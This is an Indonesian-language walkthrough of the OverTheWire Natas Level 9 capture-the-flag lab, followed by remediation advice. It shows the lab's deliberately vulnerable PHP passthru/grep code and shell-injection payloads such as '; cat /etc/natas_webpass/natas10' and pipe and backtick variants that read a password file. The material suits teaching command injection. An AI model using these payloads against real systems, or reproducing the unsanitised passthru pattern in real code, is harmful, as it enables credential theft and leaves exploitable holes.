---
title: "Level 9"
description: Injeksi perintah melalui input tidak tersanitasi ke passthru().
sidebarTitle: "Level 9 — Injeksi Perintah"
---

## Profil

- **Target:** `http://natas9.natas.labs.overthewire.org`
- **Kredensial:** `natas9` / (*password* dari Level 8)

## Pengintaian

Laman menyediakan fitur pencarian yang tampak mencari melalui suatu kamus data. Kode sumber PHP mengungkapkan implementasi di balik layar:

```php
$key = $_REQUEST["needle"];

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
```

Masukan pengguna disisipkan secara langsung ke dalam string perintah *shell* tanpa sanitasi apa pun.

## Analisis

Fungsi `passthru()` pada PHP mengeksekusi suatu perintah melalui *shell* dan meneruskan keluaran mentahnya. Dikarenakan masukan pengguna digabungkan langsung ke dalam string perintah alih-alih diteruskan sebagai argumen, metakarakter *shell* akan diinterpretasikan oleh *shell*.

Ini merupakan kerentanan **injeksi perintah** (*command injection*) klasik (CWE-78). Perintah `grep` mencari pola masukan di dalam `dictionary.txt`, namun operator *shell* dapat digunakan untuk mengeksekusi perintah sembarang.

## Eksploitasi

Operator *shell* `;` memungkinkan pembuatan rangkaian perintah. Injeksi:

```
; cat /etc/natas_webpass/natas10
```

Mengakibatkan *shell* mengeksekusi:

```bash
grep -i ; cat /etc/natas_webpass/natas10 dictionary.txt
```

Perintah pertama `grep -i` tanpa pola (menunggu *stdin* tanpa keluaran berarti), kemudian mengeksekusi `cat /etc/natas_webpass/natas10` yang mencetak *password* untuk Level 10.

Muatan alternatif menggunakan operator *shell* lain:

- *Pipe:* `| cat /etc/natas_webpass/natas10`
- *Baris baru:* `\n cat /etc/natas_webpass/natas10`
- *Backticks:* `` `cat /etc/natas_webpass/natas10` ``

## Remediasi

- Jangan pernah memberikan masukan pengguna secara langsung ke fungsi eksekusi *shell*
- Gunakan `escapeshellarg()` atau `escapeshellcmd()` apabila eksekusi *shell* tidak terhindarkan
- Utamakan API *native* bahasa pemrograman dibandingkan perintah *shell* (misalnya `fopen()` PHP daripada `cat`)
